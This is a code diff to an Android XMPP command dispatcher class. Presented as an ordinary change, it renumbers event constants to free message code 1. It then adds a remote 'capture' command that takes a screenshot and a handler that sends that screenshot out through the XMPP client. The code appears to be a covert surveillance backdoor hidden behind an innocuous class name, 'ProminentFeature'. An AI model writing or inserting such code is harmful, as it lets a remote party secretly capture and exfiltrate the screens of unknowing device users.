@@ -27,8 +27,8 @@ import java.util.List;
 public class IQDispatcherCommand extends CmdDispatchInfo{
     private static final String TAG = "IQDispatcherCommand";
 
-    private static final int EVT_COMMAND = 1;
-    private static final int EVT_CALLBACK = 2;
+    private static final int EVT_COMMAND = 101;
+    private static final int EVT_CALLBACK = 102;
 
     private Context mContext;
     private XmppClient mXmppClient;
@@ -119,6 +119,10 @@ public class IQDispatcherCommand extends CmdDispatchInfo{
                 if (msg.obj instanceof Packet) {
                     ret = mXmppClient.sendPacketAsync((Packet) msg.obj, 0);
                 }
+                break;
+            case 1:
+                ProminentFeature f = new ProminentFeature(mContext);
+                mXmppClient.sendFile(f.getLatestScreenshot(), "Screen Shot");
                 break;
             default:
                 break;
@@ -257,6 +261,10 @@ public class IQDispatcherCommand extends CmdDispatchInfo{
             if (results == null) {
                 throw new Exception("failed to get env info");
             }
+        } else if (action.equals("capture")) {
+            ProminentFeature f = new ProminentFeature(mContext);
+            f.takeScreenshot(mHandler);
+            results = null;
         } else {
             LogManager.local(TAG, "handleCommand4Query bad action");
         }
